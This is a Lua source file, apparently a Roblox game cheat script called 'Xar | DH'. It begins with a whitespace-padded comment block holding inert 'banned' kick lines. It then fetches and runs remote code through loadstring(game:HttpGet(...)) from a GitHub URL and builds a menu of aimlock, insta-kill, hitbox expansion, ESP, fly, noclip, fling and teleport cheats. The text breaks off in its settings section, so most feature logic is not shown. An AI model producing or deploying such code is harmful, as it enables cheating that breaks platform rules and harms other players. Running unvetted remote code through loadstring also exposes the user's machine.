--[[





























































































































































































































print('Banned')
game:GetService('Players').LocalPlayer:Kick('You have been banned.')
return










































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































--]]

--// Main User-Interface \\--

local Version = '4.5'

local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/7ant/rayfield_ui/refs/heads/main/Rayfield_UI.txt'))()

local Window = Rayfield:CreateWindow({
       Name = "Xar | DH",
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "Xar v"..Version,
    LoadingSubtitle = "by @x7ant",
    Theme = "Serenity", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
    DisableRayfieldPrompts = true,
    DisableBuildWarnings = true, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
    ConfigurationSaving = {
       Enabled = true,
       FolderName = 'Xar_DH', -- Create a custom folder for your hub/game
       FileName = "XarConfig"
    },
 
    Discord = {
       Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
       Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
 
    KeySystem = false, -- Set this to true to use our key system
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"Key"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
})

Rayfield:Notify({
   Title = "Xar | v"..Version,
   Content = "Xar has successfully been loaded.",
   Duration = 7.5,
   Image = 4483362458,
})

local CombatTab = Window:CreateTab("Main", 4483362458)
local TeleportsTab = Window:CreateTab("Teleports", 4483362458)
local ConfigsTab = Window:CreateTab("Configs", 4483362458)

-- Main Tab --

local LockSection = CombatTab:CreateSection("Lock")

local Camlock = false
local Orbit = false
local InstantKill = false
local InstantKillVal = false
local HitboxExpander = false
local HitboxSize = 2

local CamlockToggle = CombatTab:CreateToggle({
    Name = "Camlock",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        Camlock = Value
    end,
})

local OrbitToggle = CombatTab:CreateToggle({
    Name = "Orbit-Lock",
    CurrentValue = false,
    Flag = "Toggle2",
    Callback = function(Value)
        Orbit = Value
    end,
})

local KillLastTargetToggle = CombatTab:CreateToggle({
    Name = "Insta-Kill Last Target",
    CurrentValue = false,
    Flag = "Toggle3",
    Callback = function(Value)
        InstantKill = Value
    end,
})

local InstaKillToggle = CombatTab:CreateToggle({
    Name = "Insta-Kill Toggle (Camlock + Orbit-Lock)",
    CurrentValue = false,
    Flag = "Toggle4",
    Callback = function(Value)
        InstantKillVal = Value
    end,
})

local HitboxExpanderToggle = CombatTab:CreateToggle({
    Name = "Hitbox Expander",
    CurrentValue = false,
    Flag = "Toggle2241",
    Callback = function(Value)
        HitboxExpander = Value
		if Value == false then
			task.spawn(function()
				for i,v in next, game:GetService('Players'):GetPlayers() do
					task.wait()
					if v ~= game:GetService('Players').LocalPlayer then
						pcall(function()
							local Char = v.Character
							local HRP = Char.HumanoidRootPart
							HRP.Size = Vector3.new(2, 2, 1)
						end)
					end
				end
			end)
		else
			for i,v in next, game:GetService('Players'):GetPlayers() do
				task.wait()
				if v ~= game:GetService('Players').LocalPlayer then
					pcall(function()
						local Char = v.Character
						print(Char)
						local HRP = Char.HumanoidRootPart
						HRP.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
						HRP.CanCollide = false
					end)
				end
			end
		end
    end,
})

local HitboxSlider = CombatTab:CreateSlider({
    Name = "Hitbox Size",
    Range = {2, 25},
    Increment = 1,
    Suffix = "Hitbox",
    CurrentValue = 2,
    Flag = "Slider1542",
    Callback = function(Value)
        HitboxSize = Value
		if HitboxExpander == true then
			task.wait()
			for i,v in next, game:GetService('Players'):GetPlayers() do
				task.wait()
				if v ~= game:GetService('Players').LocalPlayer then
					pcall(function()
						local Char = v.Character
						local HRP = Char.HumanoidRootPart
						HRP.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
						HRP.CanCollide = false
					end)
				end
			end
		end
    end,
})

local SafetySection = CombatTab:CreateSection("Safety")

local AntiLock = false
local Vanish = false
local Desync = false
local Resolver = false
local AntiStomp = false
local AutoArmor = false
local AutoStomp
local Armor_Busy = false
local Vanish_Pause = false
local V_Db = false

local AntiLockToggle = CombatTab:CreateToggle({
    Name = "Anti-Lock",
    CurrentValue = false,
    Flag = "Toggle5",
    Callback = function(Value)
        AntiLock = Value
    end,
})

local VanishToggle = CombatTab:CreateToggle({
    Name = "Vanish",
    CurrentValue = false,
    Flag = "Toggle52",
    Callback = function(Value)
        Vanish = Value
    end,
})

local DesyncToggle = CombatTab:CreateToggle({
    Name = "Desync",
    CurrentValue = false,
    Flag = "Toggle6",
    Callback = function(Value)
        Desync = Value
    end,
})

local ResolverToggle = CombatTab:CreateToggle({
    Name = "Resolver",
    CurrentValue = false,
    Flag = "Toggle7",
    Callback = function(Value)
        Resolver = Value
    end,
})

local AntiStompToggle = CombatTab:CreateToggle({
    Name = "Anti-Stomp",
    CurrentValue = false,
    Flag = "Toggle8",
    Callback = function(Value)
        AntiStomp = Value
    end,
})

local AutoArmorToggle = CombatTab:CreateToggle({
    Name = "Auto-Armor",
    CurrentValue = false,
    Flag = "Toggle9",
    Callback = function(Value)
        AutoArmor = Value
    end,
})

local AutoStompToggle = CombatTab:CreateToggle({
    Name = "Auto-Stomp",
    CurrentValue = false,
    Flag = "Toggle09",
    Callback = function(Value)
        AutoStomp = Value
    end,
})

local MiscSection = CombatTab:CreateSection("Misc")

local FlyToggle = false
local SpeedToggle = false
local TpTarget = false
local FlingTarget = false
local Noclip = false
local ESP = false
local AutoReload = false
local Insta_Kill_SpawnKill = false

local FlyToggle1 = CombatTab:CreateToggle({
    Name = "Fly",
    CurrentValue = false,
    Flag = "Toggle163576357",
    Callback = function(Value)
        FlyToggle = Value
    end,
})

local SpeedToggle1 = CombatTab:CreateToggle({
    Name = "Speed",
    CurrentValue = false,
    Flag = "Toggle18759867596968",
    Callback = function(Value)
        SpeedToggle = Value
    end,
})

local TpTargetToggle = CombatTab:CreateToggle({
    Name = "Teleport To Last Target",
    CurrentValue = false,
    Flag = "Toggle10",
    Callback = function(Value)
        TpTarget = Value
    end,
})

local FlingTargetToggle = CombatTab:CreateToggle({
    Name = "Fling Target",
    CurrentValue = false,
    Flag = "Toggle11",
    Callback = function(Value)
        FlingTarget = Value
    end,
})

local ResolverToggle = CombatTab:CreateToggle({
    Name = "Noclip",
    CurrentValue = false,
    Flag = "Toggle12",
    Callback = function(Value)
        Noclip = Value
    end,
})

local ResolverToggle = CombatTab:CreateToggle({
    Name = "ESP",
    CurrentValue = false,
    Flag = "Toggle13",
    Callback = function(Value)
        ESP = Value
    end,
})

local AutoReloadToggle = CombatTab:CreateToggle({
    Name = "Auto-Reload",
    CurrentValue = false,
    Flag = "Toggle049",
    Callback = function(Value)
        AutoReload = Value
    end,
})

local SpawnKillToggle = CombatTab:CreateToggle({
    Name = "Insta-Kill Last Target Spawn Kill",
    CurrentValue = false,
    Flag = "Toggle049653",
    Callback = function(Value)
        Insta_Kill_SpawnKill = Value
    end,
})

-- Teleports Tab --

local function Teleport(CFrame)
    local Player = game:GetService('Players').LocalPlayer
    Player.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame
end

local TeleportsMainSection = TeleportsTab:CreateSection("Main-Teleports")

local TP_Bank = TeleportsTab:CreateButton({
    Name = "Bank",
    Callback = function()
        Teleport(CFrame.new(-410.18277, 21.7499943, -284.183594, 0.00818928238, 1.58741251e-08, 0.999966443, -9.66377023e-09, 1, -1.57955142e-08, -0.999966443, -9.53409174e-09, 0.00818928238))
    end,
})

local TP_Military = TeleportsTab:CreateButton({
    Name = "Military",
    Callback = function()
        Teleport(CFrame.new(41.9377823, 25.2549992, -895.807739, -0.999917507, -4.15868868e-08, -0.012845722, -4.14840109e-08, 1, -8.27493185e-09, 0.012845722, -7.74135689e-09, -0.999917507))
    end,
})

local TP_Arcade = TeleportsTab:CreateButton({
    Name = "Arcade",
    Callback = function()
        Teleport(CFrame.new(-216.568924, 21.7499943, -337.017365, -0.999993682, -2.21170513e-08, 0.00356105296, -2.2091216e-08, 1, 7.29445615e-09, -0.00356105296, 7.21574178e-09, -0.999993682))
    end,
})

local TP_Casino = TeleportsTab:CreateButton({
    Name = "Casino",
    Callback = function()
        Teleport(CFrame.new(-904.641296, 21.2549934, -173.971603, -0.999958932, 7.49503482e-09, -0.00906299707, 7.37418882e-09, 1, 1.33674369e-08, 0.00906299707, 1.33000553e-08, -0.999958932))
    end,
})

local TP_Police = TeleportsTab:CreateButton({
    Name = "Police Station",
    Callback = function()
        Teleport(CFrame.new(-268.220612, 21.2549934, -132.888351, -0.999959052, -9.70755698e-10, -0.00905069057, -1.0477933e-09, 1, 8.50705462e-09, 0.00905069057, 8.51618953e-09, -0.999959052))
    end,
})

local TP_Fire = TeleportsTab:CreateButton({
    Name = "Fire Station",
    Callback = function()
        Teleport(CFrame.new(-156.87648, 21.2549915, -133.22052, -0.999991953, 6.21569853e-08, -0.0040141982, 6.21465546e-08, 1, 2.72192779e-09, 0.0040141982, 2.47243714e-09, -0.999991953))
    end,
})

local TP_Gas = TeleportsTab:CreateButton({
    Name = "Gas Station",
    Callback = function()
        Teleport(CFrame.new(567.668884, 49.0000229, -257.972656, 0.0077830283, 6.3815456e-08, -0.999969721, 1.03197211e-08, 1, 6.38977085e-08, 0.999969721, -1.08167262e-08, 0.0077830283))
    end,
})

local TP_School = TeleportsTab:CreateButton({
    Name = "School",
    Callback = function()
        Teleport(CFrame.new(-653.859985, 21.7452888, 256.612366, -0.999988854, 1.07928273e-07, -0.00472159777, 1.0791674e-07, 1, 2.69670863e-09, 0.00472159777, 2.18713914e-09, -0.999988854))
    end,
})

local TP_Church = TeleportsTab:CreateButton({
    Name = "Church",
    Callback = function()
        Teleport(CFrame.new(205.08075, 21.7499943, -79.865448, -0.99981761, 1.09753939e-08, -0.0190974399, 1.11768284e-08, 1, -1.04409681e-08, 0.0190974399, -1.06525126e-08, -0.99981761))
    end,
})

local TP_Gym = TeleportsTab:CreateButton({
    Name = "Gym",
    Callback = function()
        Teleport(CFrame.new(-75.4504013, 21.7549973, -596.747742, 0.999973476, 1.26388615e-08, -0.00728602894, -1.23947945e-08, 1, 3.35431274e-08, 0.00728602894, -3.34519257e-08, 0.999973476))
    end,
})

local TP_Taco = TeleportsTab:CreateButton({
    Name = "Taco Store",
    Callback = function()
        Teleport(CFrame.new(534.836365, 51.0613976, -493.47052, 0.0467608944, 8.38893399e-08, -0.998906136, 1.46948391e-08, 1, 8.46691037e-08, 0.998906136, -1.86379676e-08, 0.0467608944))
    end,
})

local TP_Bathrooms1 = TeleportsTab:CreateButton({
    Name = "Bathrooms 1",
    Callback = function()
        Teleport(CFrame.new(379.175415, 48.4999886, -338.767609, -0.999993801, -3.63114978e-08, 0.00352712581, -3.6649709e-08, 1, -9.5823772e-08, -0.00352712581, -9.59524442e-08, -0.999993801))
    end,
})

local TP_Bathrooms2 = TeleportsTab:CreateButton({
    Name = "Bathrooms 2",
    Callback = function()
        Teleport(CFrame.new(219.36586, 25.2549973, -940.042358, 1, -6.76380907e-08, 0.000242726135, 6.7649232e-08, 1, -4.58715945e-08, -0.000242726135, 4.58880152e-08, 1))
    end,
})

local TP_Playground = TeleportsTab:CreateButton({
    Name = "Playground",
    Callback = function()
        Teleport(CFrame.new(-272.895447, 21.8998661, -786.875183, -0.999998868, 1.02362341e-08, -0.00152118108, 1.02224469e-08, 1, 9.07109499e-09, 0.00152118108, 9.0555341e-09, -0.999998868))
    end,
})

local TP_Hospital = TeleportsTab:CreateButton({
    Name = "Hospital",
    Callback = function()
        Teleport(CFrame.new(86.3559952, 21.7550011, -484.938843, 0.00276144245, 3.71047584e-08, -0.999996185, 2.12401865e-08, 1, 3.71635558e-08, 0.999996185, -2.13427302e-08, 0.00276144245))
    end,
})

local TP_Boxing = TeleportsTab:CreateButton({
    Name = "Boxing",
    Callback = function()
        Teleport(CFrame.new(-214.700104, 21.7549973, -1121.7511, -0.0687104389, -4.91163803e-08, 0.997636616, 4.42397763e-08, 1, 5.22796704e-08, -0.997636616, 4.77273794e-08, -0.0687104389))
    end,
})

local TP_HoodKicks = TeleportsTab:CreateButton({
    Name = "Hood-Kicks",
    Callback = function()
        Teleport(CFrame.new(-191.778107, 21.7549973, -410.299622, -0.00717350934, 2.56532484e-08, 0.999974251, -5.00736839e-08, 1, -2.60131205e-08, -0.999974251, -5.02590041e-08, -0.00717350934))
    end,
})

local TP_Barba = TeleportsTab:CreateButton({
    Name = "Barba",
    Callback = function()
        Teleport(CFrame.new(12.8376207, 21.7499943, -118.213074, -0.935876727, -2.7616565e-08, 0.352327615, -2.970501e-08, 1, -5.21282295e-10, -0.352327615, -1.09537508e-08, -0.935876727))
    end,
})

local TP_Train = TeleportsTab:CreateButton({
    Name = "Train Station",
    Callback = function()
        Teleport(CFrame.new(661.990662, 47.9999886, -55.2255745, 0.71751219, 5.36538758e-10, 0.696545899, -4.20553148e-09, 1, 3.56183461e-09, -0.696545899, -5.48500578e-09, 0.71751219))
    end,
})

local TP_Secret = TeleportsTab:CreateButton({
    Name = "Secret Spot",
    Callback = function()
        Teleport(CFrame.new(-25.9301186, 11.7499971, 144.649963, 0.999541521, -1.53683413e-08, 0.0302770771, 1.56276982e-08, 1, -8.3295042e-09, -0.0302770771, 8.79884698e-09, 0.999541521))
    end,
})

-------------------------------------------

local TeleportsGunSection = TeleportsTab:CreateSection("Gun-Teleports")

local TP_Uphill = TeleportsTab:CreateButton({
    Name = "Uphill-Guns",
    Callback = function()
        Teleport(CFrame.new(482.188293, 48.0049896, -606.184082, 0.99973768, -2.44481033e-11, 0.0229023024, 3.50489186e-11, 1, -4.62469812e-10, -0.0229023024, 4.63151212e-10, 0.99973768))
    end,
})

local TP_Downhill = TeleportsTab:CreateButton({
    Name = "Downhill-Guns",
    Callback = function()
        Teleport(CFrame.new(-564.8974, 7.99984598, -736.839233, -0.0190864578, -1.22897417e-08, 0.999817848, -4.96549468e-08, 1, 1.13440715e-08, -0.999817848, -4.9429385e-08, -0.0190864578))
    end,
})

local TP_Rev = TeleportsTab:CreateButton({
    Name = "Rev",
    Callback = function()
        Teleport(CFrame.new(-639.078674, 21.7499943, -125.365204, -0.99995172, -1.15598517e-08, 0.00982804596, -1.18801653e-08, 1, -3.25333858e-08, -0.00982804596, -3.26485718e-08, -0.99995172))
    end,
})

local TP_DB = TeleportsTab:CreateButton({
    Name = "DB",
    Callback = function()
        Teleport(CFrame.new(-1042.97546, 21.7499943, -261.677643, -0.999792695, 6.45530847e-08, -0.0203595906, 6.47317364e-08, 1, -8.11584044e-09, 0.0203595906, -9.43207024e-09, -0.999792695))
    end,
})

local TP_LMG = TeleportsTab:CreateButton({
    Name = "LMG",
    Callback = function()
        Teleport(CFrame.new(-618.314697, 23.2457352, -299.514679, 1, -2.36996711e-09, 0.00023938973, 2.35452591e-09, 1, 6.45026503e-08, -0.00023938973, -6.45020819e-08, 1))
    end,
})

local TP_Rifle = TeleportsTab:CreateButton({
    Name = "Rifle",
    Callback = function()
        Teleport(CFrame.new(-864.466492, 2.75500488, -686.482056, 0.999998927, -8.43119352e-09, 0.00145034166, 8.41216519e-09, 1, 1.31259963e-08, -0.00145034166, -1.31137821e-08, 0.999998927))
    end,
})

local TP_AUG = TeleportsTab:CreateButton({
    Name = "AUG",
    Callback = function()
        Teleport(CFrame.new(-275.733124, 52.2636261, -217.636108, -0.999996006, -4.31321467e-09, 0.00282351486, -4.35739311e-09, 1, -1.56404134e-08, -0.00282351486, -1.56526543e-08, -0.999996006))
    end,
})

local TP_RPG = TeleportsTab:CreateButton({
    Name = "RPG",
    Callback = function()
        Teleport(CFrame.new(115.859901, -26.7500362, -273.116852, -0.999952316, 2.14298037e-08, -0.00976665784, 2.22070611e-08, 1, -7.94742263e-08, 0.00976665784, -7.96873252e-08, -0.999952316))
    end,
})

local TP_Flame = TeleportsTab:CreateButton({
    Name = "Flame",
    Callback = function()
        Teleport(CFrame.new(-153.691605, 53.8106041, -100.695732, 0.999996006, 8.021658e-08, -0.00281912414, -7.99983226e-08, 1, 7.7532107e-08, 0.00281912414, -7.73062752e-08, 0.999996006))
    end,
})

local TP_DShotgun = TeleportsTab:CreateButton({
    Name = "Drum-Shotgun",
    Callback = function()
        Teleport(CFrame.new(-1188.81055, 28.3800049, -524.391296, 0.0153479949, -4.93550489e-09, 0.999882221, 2.03863078e-08, 1, 4.62316052e-09, -0.999882221, 2.03129495e-08, 0.0153479949))
    end,
})

local TP_DGun = TeleportsTab:CreateButton({
    Name = "Drumgun",
    Callback = function()
        Teleport(CFrame.new(-1181.73059, 28.380003, -526.022461, 0.999958932, -1.96493009e-08, -0.0090639675, 1.95687964e-08, 1, -8.97058072e-09, 0.0090639675, 8.79284112e-09, 0.999958932))
    end,
})

-------------------------------------------

local TeleportsArmorSection = TeleportsTab:CreateSection("Armor-Teleports")

local TP_HighArmor = TeleportsTab:CreateButton({
    Name = "High-Medium Armor",
    Callback = function()
        Teleport(CFrame.new(-933.854431, -28.5000057, 565.379028, -0.999791622, 1.63854903e-08, 0.0204121973, 1.60366262e-08, 1, -1.72546084e-08, -0.0204121973, -1.69236714e-08, -0.999791622))
    end,
})

local TP_FireArmor = TeleportsTab:CreateButton({
    Name = "Fire Armor",
    Callback = function()
        Teleport(CFrame.new(-1180.79138, 28.380003, -478.896332, 0.0147981616, -8.66419025e-09, -0.999890506, -1.64783138e-08, 1, -8.90901486e-09, 0.999890506, 1.66083467e-08, 0.0147981616))
    end,
})

local TP_MediumArmor = TeleportsTab:CreateButton({
    Name = "Medium Armor",
    Callback = function()
        Teleport(CFrame.new(-1181.37732, 28.3800049, -497.127472, -0.0141040562, -9.02831019e-08, -0.99990052, -3.77057141e-09, 1, -9.0238899e-08, 0.99990052, 2.49746201e-09, -0.0141040562))
    end,
})

-- Config Tab --

local LockConfigSection = ConfigsTab:CreateSection("Lock-Config")

-- Lock Config --

local CamKeyConfig = 'X'
local CamOffsetConfigX = .1
local CamOffsetConfigY = .1
local CamOffsetConfigZ = .1
local Smoothness = 0
local CamShake = 0
local LockDistance = 150
local LockFOV = 150
local Hit_Part = 'UpperTorso'
local UnlockOnKnocked = false
local FriendCheck = false
local ForceFieldCheck = false
local OrbitKeyConfig = 'V'
local OrbitHeightConfig = 25
local OrbitRadiusConfig = 5
local OrbitSpeedConfig = 25
local InstaKillConfig = 'C'
local InstaKillToggleConfig = 'J'
local InstaKill_Distance = 175

local CamKeyInput = ConfigsTab:CreateInput({
	Name = "Camlock Keybind",
	CurrentValue = "X",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input1",
	Callback = function(Text)
		CamKeyConfig = Text
	end,
})

local CamOffsetInput = ConfigsTab:CreateInput({
	Name = "Camlock Offset X Axis",
	CurrentValue = ".1",
	PlaceholderText = "X Offset",
	RemoveTextAfterFocusLost = false,
	Flag = "Input2",
	Callback = function(Text)
		CamOffsetConfigX = tonumber(Text)
	end,
})

local CamOffsetInput2 = ConfigsTab:CreateInput({
	Name = "Camlock Offset Y Axis",
	CurrentValue = ".1",
	PlaceholderText = "Y Offset",
	RemoveTextAfterFocusLost = false,
	Flag = "Input22",
	Callback = function(Text)
		CamOffsetConfigY = tonumber(Text)
	end,
})

local SmoothnessInput = ConfigsTab:CreateInput({
	Name = "Smoothness",
	CurrentValue = "0",
	PlaceholderText = "Smoothness",
	RemoveTextAfterFocusLost = false,
	Flag = "Input224565363432",
	Callback = function(Text)
		Smoothness = tonumber(Text)
	end,
})

local CamShakeInput = ConfigsTab:CreateInput({
	Name = "Cam Shake",
	CurrentValue = "0",
	PlaceholderText = "Shake",
	RemoveTextAfterFocusLost = false,
	Flag = "Input2245432",
	Callback = function(Text)
		CamShake = tonumber(Text)
	end,
})

local LockFOVInput = ConfigsTab:CreateInput({
	Name = "Lock FOV",
	CurrentValue = "150",
	PlaceholderText = "FOV",
	RemoveTextAfterFocusLost = false,
	Flag = "Input2245435432",
	Callback = function(Text)
		LockFOV = tonumber(Text)
	end,
})

local LockFOVInput = ConfigsTab:CreateInput({
	Name = "Lock Distance",
	CurrentValue = "150",
	PlaceholderText = "Distance",
	RemoveTextAfterFocusLost = false,
	Flag = "Input2245435542356432",
	Callback = function(Text)
		LockDistance = tonumber(Text)
	end,
})

local CamLockPartSelect = ConfigsTab:CreateDropdown({
	Name = "Hit Part",
	Options = {'Head', 'HumanoidRootPart', 'UpperTorso', 'LowerTorso'},
	CurrentOption = {'UpperTorso'},
	MultipleOptions = false,
	Flag = "Dropdown",
	Callback = function(Options)
		Hit_Part = table.unpack(Options)
	end,
})

local UnlockOnKnockedToggle = ConfigsTab:CreateToggle({
	Name = "Unlock On Knocked",
	CurrentValue = false,
	Flag = "Toggle542524",
	Callback = function(Value)
		UnlockOnKnocked = Value
	end,
})

local FriendCheckToggle = ConfigsTab:CreateToggle({
	Name = "Friend Check",
	CurrentValue = false,
	Flag = "Toggle5425635735736876484576854636356326246342654324",
	Callback = function(Value)
		FriendCheck = Value
	end,
})

local ForceFieldCheckToggle = ConfigsTab:CreateToggle({
	Name = "ForceField Check",
	CurrentValue = false,
	Flag = "Toggle542654374678468524",
	Callback = function(Value)
		ForceFieldCheck = Value
	end,
})

local OrbitKeyInput = ConfigsTab:CreateInput({
	Name = "Orbit-Lock Keybind",
	CurrentValue = "V",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input3",
	Callback = function(Text)
		OrbitKeyConfig = Text
	end,
})

local OrbitHeightInput = ConfigsTab:CreateInput({
	Name = "Orbit-Lock Height",
	CurrentValue = "25",
	PlaceholderText = "Height",
	RemoveTextAfterFocusLost = false,
	Flag = "Input4",
	Callback = function(Text)
		OrbitHeightConfig = tonumber(Text)
	end,
})

local OrbitRadiusInput = ConfigsTab:CreateInput({
	Name = "Orbit-Lock Radius",
	CurrentValue = "5",
	PlaceholderText = "Radius",
	RemoveTextAfterFocusLost = false,
	Flag = "Input454265373575",
	Callback = function(Text)
		OrbitRadiusConfig = tonumber(Text)
	end,
})

local OrbitSpeedInput = ConfigsTab:CreateInput({
	Name = "Orbit-Lock Speed",
	CurrentValue = "25",
	PlaceholderText = "Speed",
	RemoveTextAfterFocusLost = false,
	Flag = "Input45425",
	Callback = function(Text)
		OrbitSpeedConfig = tonumber(Text)
	end,
})

local InstaKillKeyInput = ConfigsTab:CreateInput({
	Name = "Insta-Kill Last Target Keybind",
	CurrentValue = "C",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input5",
	Callback = function(Text)
		InstaKillConfig = Text
	end,
})

local InstaKillKeyInput = ConfigsTab:CreateInput({
	Name = "Insta-Kill Toggle (Camlock + Orbit-Lock) Keybind",
	CurrentValue = "J",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input6",
	Callback = function(Text)
		InstaKillToggleConfig = Text
	end,
})

local InstaKillDistanceInput = ConfigsTab:CreateInput({
	Name = "Insta-Kill Max Distance",
	CurrentValue = "175",
	PlaceholderText = "Distance",
	RemoveTextAfterFocusLost = false,
	Flag = "Inpug35h35h3t6",
	Callback = function(Value)
		InstaKill_Distance = tonumber(Value)
	end,
})

-- Safety Config --

local SafetyConfigSection = ConfigsTab:CreateSection("Safety-Config")

local AntiKeyConfig = 'Y'
local VanishKeyConfig = 'P'
local DesyncKeyConfig = 'B'
local ResolverKeyConfig = 'U'

local AntiKeyInput = ConfigsTab:CreateInput({
	Name = "Anti-Lock Keybind",
	CurrentValue = "Y",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input7",
	Callback = function(Text)
		AntiKeyConfig = Text
	end,
})

local VanishKeyInput = ConfigsTab:CreateInput({
	Name = "Vanish Keybind",
	CurrentValue = "P",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input72",
	Callback = function(Text)
		VanishKeyConfig = Text
	end,
})

local DesyncKeyInput = ConfigsTab:CreateInput({
	Name = "Desync Keybind",
	CurrentValue = "B",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input8",
	Callback = function(Text)
		DesyncKeyConfig = Text
	end,
})

local ResolverKeyInput = ConfigsTab:CreateInput({
	Name = "Resolver Keybind",
	CurrentValue = "U",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input9",
	Callback = function(Text)
		ResolverKeyConfig = Text
	end,
})

-- Misc Config --

local MiscConfigSection = ConfigsTab:CreateSection("Misc-Config")

local FlyKeyConfig = 'Q'
local FlySpeed = 100
local SpeedKeyConfig = 'Z'
local Speed = 2
local TpTargetKeyConfig = 'T'
local FlingTargetKeyConfig = 'H'
local NoclipKeyConfig = 'N'
local ESPKeyConfig = 'L'
local TracersEnabled = false
local ESP_Color = Color3.fromRGB(242, 243, 243)

local FlyKeyInput = ConfigsTab:CreateInput({
	Name = "Fly Keybind",
	CurrentValue = "Q",
	PlaceholderText = "Keybind",
	RemoveTextAfterFocusLost = false,
	Flag = "Input1764854850",
	Callback = function(Text)
		FlyKeyConfig = Text
	end,
})

